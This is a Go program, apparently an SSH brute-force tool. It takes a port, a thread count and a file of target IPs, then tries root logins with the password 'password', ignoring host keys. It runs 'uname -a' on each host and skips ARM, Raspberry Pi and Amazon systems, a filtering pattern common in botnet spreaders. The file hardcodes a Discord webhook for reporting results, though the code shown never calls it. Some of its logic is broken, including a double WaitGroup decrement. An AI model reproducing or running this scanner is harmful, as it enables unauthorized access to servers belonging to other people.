package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	hardcorewebhook = "https://discord.com/api/webhooks/1199622995040280576/Il4yqAF8NVkXa2SRFShERIqxFFXVB4DNfmNOFLEP9WAVF1khOxH8xZLSCfI4VI8OHzKG"
)

// Funcție dummy pentru a folosi pachetele importate
func useUnusedPackages() {
	_, _ = ioutil.ReadFile("dummy.txt") // Utilizare pentru `io/ioutil`
	_ = exec.Command("echo", "dummy")  // Utilizare pentru `os/exec`
}

func checkThreads(routines int, thread int64) bool {
	return int64(routines) <= thread
}

var (
	ipfile  string
	threads string
	port    string
)

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	return !os.IsNotExist(err) && !info.IsDir()
}

func init() {
	useUnusedPackages() // Apelăm funcția pentru a folosi pachetele
	if len(os.Args) <= 3 {
		fmt.Println("Usage: [brute] [port] [threads] [iplist]")
		os.Exit(1)
	} else {
		ipfile = os.Args[3]
		threads = os.Args[2]
		port = os.Args[1]
	}
}

func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
	c := make(chan struct{})
	go func() {
		defer close(c)
		wg.Wait()
	}()
	select {
	case <-c:
		return false
	case <-time.After(timeout):
		return true
	}
}

func isExcludedSystem(unameOutput string) bool {
	excludedSystems := []string{"aarch", "amzn", "amzn2", "armv7l", "raspberry", "raspberrypi"}
	for _, excluded := range excludedSystems {
		if strings.Contains(unameOutput, excluded) {
			return true
		}
	}
	return false
}

type DiscordMessage struct {
	Embeds []Embed `json:"embeds"`
}

type Embed struct {
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
	Color       int    `json:"color,omitempty"`
	Author      Author `json:"author,omitempty"`
	Footer      Footer `json:"footer,omitempty"`
}

type Author struct {
	Name string `json:"name,omitempty"`
}

type Footer struct {
	Text string `json:"text,omitempty"`
}

func toDiscord(message DiscordMessage, webhookURL string) {
	payload, err := json.Marshal(message)
	if err != nil {
		return
	}
	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return
	}
	defer resp.Body.Close()
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func remoteRun(user string, addr string, pass string, cmd string, wg *sync.WaitGroup) (string, error) {
	defer wg.Done()

	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout: 40 * time.Second,
	}

	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
	if err != nil {
		return "", err
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	var b bytes.Buffer
	session.Stdout = &b

	err = session.Run(cmd)
	if err != nil {
		return "", err
	}

	if isExcludedSystem(b.String()) {
		log.Printf("IP %s excluded due to system: %s", addr, b.String())
		return "", nil
	}

	return b.String(), nil
}

// Worker function that runs SSH commands in a controlled manner.
func worker(id int, jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for ip := range jobs {
		output, err := remoteRun("root", ip, "password", "uname -a", wg)
		if err == nil {
			fmt.Printf("Worker %d: Success for IP %s: %s\n", id, ip, output)
		} else {
			fmt.Printf("Worker %d: Error for IP %s: %s\n", id, ip, err)
		}
	}
}

func main() {
	lines, err := readLines(ipfile)
	if err != nil {
		log.Fatalf("readLines: %s", err)
	}

	var wg sync.WaitGroup
	uniqueIPs := make(map[string]bool)

	for _, line := range lines {
		ip := strings.TrimSpace(line)
		if ip != "" {
			uniqueIPs[ip] = true
		}
	}

	var ips []string
	for ip := range uniqueIPs {
		ips = append(ips, ip)
	}

	// Create a channel to pass jobs (IP addresses) to workers
	jobs := make(chan string, len(ips))

	// Launch workers
	numWorkers := 5 // Define the number of concurrent workers
	for w := 1; w <= numWorkers; w++ {
		wg.Add(1)
		go worker(w, jobs, &wg)
	}

	// Send the IPs to the workers
	for _, ip := range ips {
		jobs <- ip
	}
	close(jobs)

	// Wait for all workers to complete
	wg.Wait()

	timeout := 90 * time.Second
	if waitTimeout(&wg, timeout) {
		fmt.Println("Execution timed out")
	} else {
		fmt.Println("Execution completed")
	}
}
